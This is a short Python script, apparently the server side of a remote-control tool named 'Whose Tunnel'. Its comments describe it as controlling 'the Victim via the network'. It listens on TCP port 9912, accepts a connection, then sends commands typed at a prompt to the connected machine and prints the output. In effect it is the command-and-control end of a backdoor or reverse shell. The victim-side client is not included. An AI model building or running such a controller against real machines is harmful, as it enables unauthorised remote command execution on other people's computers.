#The Server program will be used to control the Victim via the network
import socket
import os
import sys
#used for ASCII Art !
import pyfiglet

whose_tunnel=pyfiglet.figlet_format('Whose Tunnel')
print(whose_tunnel)
print('-'*100)
#preventing hardcoded address !
HOST=socket.gethostbyname(socket.gethostname())
#choosing a port number between 0-65535(reserved ones are between 0-1023)
PORT=9912
try:
	#creating a tcp socket !
	server=socket.socket()
	print(f'Binding the IP address: {HOST} to the Port: {PORT}')
	server.bind((HOST,PORT))
	print('Listening to 3 Clients without network timeout !')
	server.listen(3)
	print('The Server is now ready accept Connections...........')
	conn,addr=server.accept()
	print(f'Connected to {addr[0]} which is on {addr[1]} !')
	#the message object !
	cmd=''
	while True:
		if cmd.lower()=='quit':
			conn.close()
			break
		cmd=input('>>')
		conn.send(cmd.encode())
		print(conn.recv(1024).decode())
except Exception as e:
	print(f'The Socket Stream Met With An Error: {e}')
